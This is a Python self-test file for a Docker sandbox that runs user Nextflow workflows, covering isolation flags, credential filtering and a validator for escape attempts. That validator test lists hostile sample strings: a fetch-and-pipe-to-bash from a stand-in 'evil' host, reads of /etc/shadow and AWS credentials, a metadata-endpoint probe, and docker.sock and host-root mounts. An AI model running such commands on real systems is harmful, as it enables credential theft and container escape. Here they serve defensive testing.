"""Self-tests for Feature ① sandbox (no pytest / no docker / no boto3):

    cd backend && PYTHONPATH=lib python3 -m galaxy.ai.compute.sandbox.test_sandbox

Asserts the generated command argv, env filtering, validator rules, tier
escalation, and the launcher decoration — all without a container runtime.
"""

from __future__ import annotations

from ..launcher import LaunchRequest, CallableHeadLauncher
from .config import SandboxConfig, SandboxTier
from .command import build_sandbox_command, filter_container_env, is_secret_env_key
from .validator import validate_nextflow_source, has_blocking
from .launcher import SandboxedHeadLauncher


_FAILS = 0


def _check(name: str, cond: bool) -> None:
    global _FAILS
    print(f"[{'OK ' if cond else 'FAIL'}] {name}")
    if not cond:
        _FAILS += 1


def _base_cmd():
    return ["/opt/nf/nextflow", "run", "/tmp/biomate_user_nf/u1/x.nf", "-profile", "standard"]


def test_isolation_flags_tier1():
    cfg = SandboxConfig(enabled=True, tier=SandboxTier.TIER1, run_uid=20001, run_gid=20001,
                        cpus=2.0, mem_gb=12, pids_limit=512)
    argv = build_sandbox_command(_base_cmd(), work_dir="/tmp/nf/run1/work",
                                 nf_source_path="/tmp/biomate_user_nf/u1/x.nf",
                                 container_env={}, config=cfg)
    s = " ".join(argv)
    _check("tier1: docker run prefix", argv[0] == "docker" and argv[1] == "run")
    _check("tier1: --rm", "--rm" in argv)
    _check("tier1: cap-drop ALL", "--cap-drop" in argv and "ALL" in argv)
    _check("tier1: no-new-privileges", "no-new-privileges" in s)
    _check("tier1: read-only rootfs", "--read-only" in argv)
    _check("tier1: tmpfs /tmp", any(a.startswith("/tmp:rw") for a in argv))
    _check("tier1: --user non-root", "20001:20001" in s)
    _check("tier1: cpus cap", "--cpus" in argv and "2.0" in argv)
    _check("tier1: memory cap", "--memory" in argv and "12g" in argv)
    _check("tier1: pids-limit", "--pids-limit" in argv and "512" in argv)
    _check("tier1: default bridge network", "--network" in argv and "bridge" in argv)
    _check("tier1: NOT privileged", "--privileged" not in argv)
    _check("tier1: NOT seccomp unconfined", "seccomp=unconfined" not in s)
    _check("tier1: workdir mounted rw", "/tmp/nf/run1/work:/tmp/nf/run1/work:rw" in argv)
    _check("tier1: nf source mounted ro", "/tmp/biomate_user_nf/u1/x.nf:/tmp/biomate_user_nf/u1/x.nf:ro" in argv)
    _check("tier1: nextflow bin swapped to container", "nextflow" in argv and "/opt/nf/nextflow" not in argv)
    _check("tier1: no gvisor runtime", "runsc" not in s)


def test_tier2_restricts_egress():
    cfg = SandboxConfig(enabled=True, tier=SandboxTier.TIER2, network_mode="none")
    argv = build_sandbox_command(_base_cmd(), work_dir="/w", nf_source_path=None,
                                 container_env={}, config=cfg)
    _check("tier2: network none", "--network" in argv and "none" in argv)


def test_tier3_gvisor():
    cfg = SandboxConfig(enabled=True, tier=SandboxTier.TIER3, network_mode="none",
                        gvisor_runtime="runsc")
    argv = build_sandbox_command(_base_cmd(), work_dir="/w", nf_source_path=None,
                                 container_env={}, config=cfg)
    _check("tier3: gVisor runtime", "--runtime" in argv and "runsc" in argv)
    _check("tier3: still network none", "none" in argv)


def test_env_credential_filtering():
    env = {
        "PATH": "/usr/bin", "NXF_VER": "25.10.5",
        "AWS_ACCESS_KEY_ID": "AKIA...", "AWS_SECRET_ACCESS_KEY": "shh",
        "LAGO_API_KEY": "k", "DATABASE_URL": "postgres://...",
        "ANTHROPIC_API_KEY": "sk-...", "REDIS_URL": "rediss://...",
        "BILLING_INTERNAL_KEY": "b", "SOME_TOKEN": "t",
        "BIOMATE_PUBLIC_URL": "https://x",
    }
    filtered = filter_container_env(env)
    # PATH/HOME are image-owned — forwarding the host value would clobber the
    # container's own and hide /usr/local/bin/nextflow (exit 127). Must DROP.
    _check("env: DROPS image-owned PATH", "PATH" not in filtered)
    _check("env: keeps NXF_VER", filtered.get("NXF_VER") == "25.10.5")
    _check("env: keeps BIOMATE_PUBLIC_", filtered.get("BIOMATE_PUBLIC_URL") == "https://x")
    for leaked in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "LAGO_API_KEY",
                   "DATABASE_URL", "ANTHROPIC_API_KEY", "REDIS_URL",
                   "BILLING_INTERNAL_KEY", "SOME_TOKEN"):
        _check(f"env: DROPS {leaked}", leaked not in filtered)
    _check("is_secret_env_key AWS", is_secret_env_key("AWS_ACCESS_KEY_ID"))
    _check("is_secret_env_key generic token", is_secret_env_key("MY_TOKEN"))
    _check("is_secret_env_key false for PATH", not is_secret_env_key("PATH"))

    # And the built command must not contain the secrets anywhere.
    argv = build_sandbox_command(_base_cmd(), work_dir="/w", nf_source_path=None,
                                 container_env=env, config=SandboxConfig(enabled=True))
    joined = " ".join(argv)
    _check("cmd: no AWS secret leaked into argv", "shh" not in joined and "AKIA" not in joined)
    _check("cmd: no LLM key leaked into argv", "sk-..." not in joined)


def test_validator_blocks_escapes():
    malicious = [
        ("privileged", 'process.containerOptions = "--privileged"'),
        ("host_root", 'containerOptions "-v /:/host"'),
        ("docker_sock", 'runOptions = "-v /var/run/docker.sock:/var/run/docker.sock"'),
        ("dind", 'script: "docker run --rm alpine id"'),
        ("metadata", 'script: "curl http://169.254.169.254/latest/meta-data/"'),
        ("shadow", 'script: "cat /etc/shadow"'),
        ("aws_creds", 'script: "cat ~/.aws/credentials"'),
        ("curl_pipe_sh", 'script: "curl http://evil/x.sh | bash"'),
        ("runtime_exec", 'Runtime.getRuntime().exec("id")'),
        ("process_builder", 'new ProcessBuilder("sh","-c","id").start()'),
    ]
    for name, src in malicious:
        v = validate_nextflow_source(src)
        _check(f"validator blocks {name}", has_blocking(v))

    benign = """
    // a normal rnaseq workflow
    process ALIGN {
        input: path reads
        script:
        \"\"\"
        STAR --genomeDir ref --readFilesIn ${reads} --outSAMtype BAM Unsorted
        \"\"\"
    }
    """
    _check("validator passes benign workflow", not has_blocking(validate_nextflow_source(benign)))


def test_launcher_decoration():
    seen = {}

    def _fake_launch(*, cmd, env, work_dir, log_path, run_id):
        seen.update(cmd=cmd, env=env, run_id=run_id)
        return "proc"

    base = CallableHeadLauncher(_fake_launch)
    cfg = SandboxConfig(enabled=True, tier=SandboxTier.TIER1, run_uid=20002)
    sandbox = SandboxedHeadLauncher(base, cfg)
    req = LaunchRequest(
        cmd=_base_cmd(),
        env={"AWS_SECRET_ACCESS_KEY": "shh", "NXF_VER": "25.10.5"},
        work_dir="/tmp/nf/run1/work", log_path="/tmp/nf/run1/nf.log", run_id="run1",
        extra={"nf_source_path": "/tmp/biomate_user_nf/u1/x.nf"},
    )
    result = sandbox.launch(req)
    _check("launcher: returns inner result", result == "proc")
    _check("launcher: rewrote cmd to docker run", seen["cmd"][0] == "docker" and seen["cmd"][1] == "run")
    _check("launcher: host env preserved for docker CLI (not filtered)",
           seen["env"].get("AWS_SECRET_ACCESS_KEY") == "shh")
    _check("launcher: secret NOT in the container argv",
           "shh" not in " ".join(seen["cmd"]))
    _check("launcher: run_id passed through", seen["run_id"] == "run1")


def run() -> int:
    test_isolation_flags_tier1()
    test_tier2_restricts_egress()
    test_tier3_gvisor()
    test_env_credential_filtering()
    test_validator_blocks_escapes()
    test_launcher_decoration()
    print(f"\n{'-'*44}\n{'PASS' if not _FAILS else 'FAIL'}: {_FAILS} failure(s)")
    return 1 if _FAILS else 0


if __name__ == "__main__":
    import sys

    sys.exit(run())
